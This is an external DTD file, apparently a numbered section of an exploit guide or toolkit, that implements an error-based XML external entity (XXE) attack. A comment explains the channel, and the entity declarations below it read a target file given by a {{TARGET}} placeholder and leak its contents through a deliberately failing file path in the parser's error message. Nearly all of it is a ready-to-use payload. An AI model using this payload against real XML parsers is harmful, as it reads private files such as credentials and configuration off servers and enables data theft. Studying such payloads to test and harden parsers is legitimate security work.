<!-- §5.4 - external DTD for the error-based channel: force a failure on a
     path that carries the stolen data, and read it out of the error message.

     Note the explicit file:// on %file. Inside a DTD fetched over HTTP the base URI
     is that HTTP URL, so a scheme-less path - even an absolute one - is resolved
     against it and fetched back from the attacker's own server instead of the
     target's disk. A remote DTD must name the scheme. -->
<!ENTITY % file SYSTEM "file://{{TARGET}}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
